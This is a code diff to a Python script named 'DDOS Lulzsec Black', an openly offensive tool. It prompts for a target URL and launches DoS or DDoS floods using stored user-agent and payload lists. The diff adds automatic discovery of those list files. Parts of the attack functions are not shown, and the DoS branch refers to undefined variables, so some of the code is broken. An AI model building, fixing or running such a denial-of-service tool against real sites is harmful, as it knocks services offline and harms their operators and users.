@@ -5,6 +5,7 @@ import pyfiglet
 import requests
 from urllib.parse import urlparse
 import time
+import os
 
 # Function to check if target is protected
 def check_protection(target_url):
@@ -70,29 +71,49 @@ def ddos_attack(target_url, num_threads, user_agents_file, payloads_file):
     except Exception as e:
         print(f"Error in DDoS attack: {e}")
 
+def find_files_in_directory(directory):
+    files = []
+    for filename in os.listdir(directory):
+        if os.path.isfile(os.path.join(directory, filename)):
+            files.append(filename)
+    return files
+
 if __name__ == "__main__":
     ascii_banner = pyfiglet.figlet_format("DDOS Lulzsec Black")
     print(ascii_banner)
 
     target_url = input("Enter target URL (e.g., http://example.com): ")
-    user_agents_file = "User-Agents.txt"  # File containing user agents
-    payloads_file = "Payloads.txt"  # File containing payloads
+    directory = os.path.dirname(os.path.abspath(__file__))  # Get current script directory
+    files_in_directory = find_files_in_directory(directory)
     
-    if check_protection(target_url):
-        attack_type = input("Select attack type:\n1. DoS Attack\n2. DDoS Attack\nEnter attack type (1 or 2): ")
-        
-        if attack_type == "1":
-            num_threads = int(input("Enter number of threads for DoS attack: "))
-            while True:
-                dos_attack(target_url, random.choice(user_agents), random.choice(payloads))
-        
-        elif attack_type == "2":
-            num_threads = int(input("Enter number of threads for DDoS attack: "))
-            print(f"Launching DDoS attack with {num_threads} threads on {target_url}...")
-            ddos_attack(target_url, num_threads, user_agents_file, payloads_file)
+    user_agents_file = None
+    payloads_file = None
+    
+    # Find appropriate files
+    for filename in files_in_directory:
+        if "User-Agents" in filename:
+            user_agents_file = filename
+        elif "Payloads" in filename:
+            payloads_file = filename
+    
+    if user_agents_file is None or payloads_file is None:
+        print("Error: Required files (User-Agents.txt and Payloads.txt) not found in the directory.")
+    else:
+        if check_protection(target_url):
+            attack_type = input("Select attack type:\n1. DoS Attack\n2. DDoS Attack\nEnter attack type (1 or 2): ")
+            
+            if attack_type == "1":
+                num_threads = int(input("Enter number of threads for DoS attack: "))
+                while True:
+                    dos_attack(target_url, random.choice(user_agents), random.choice(payloads))
+            
+            elif attack_type == "2":
+                num_threads = int(input("Enter number of threads for DDoS attack: "))
+                print(f"Launching DDoS attack with {num_threads} threads on {target_url}...")
+                ddos_attack(target_url, num_threads, user_agents_file, payloads_file)
+            
+            else:
+                print("Invalid attack type. Please enter 1 or 2.")
         
         else:
-            print("Invalid attack type. Please enter 1 or 2.")
-    
-    else:
-        print("Target is not vulnerable or unreachable.")
+            print("Target is not vulnerable or unreachable.")
